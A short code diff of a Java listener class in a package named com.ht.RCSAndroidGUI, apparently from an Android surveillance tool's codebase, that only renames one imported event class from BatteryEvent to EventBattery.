@@ -10,7 +10,7 @@ package com.ht.RCSAndroidGUI.listener;
 import java.util.Iterator;
 import java.util.Stack;
 
-import com.ht.RCSAndroidGUI.event.BatteryEvent;
+import com.ht.RCSAndroidGUI.event.EventBattery;
 import com.ht.RCSAndroidGUI.interfaces.Observer;
 
 public abstract class Listener<U> {
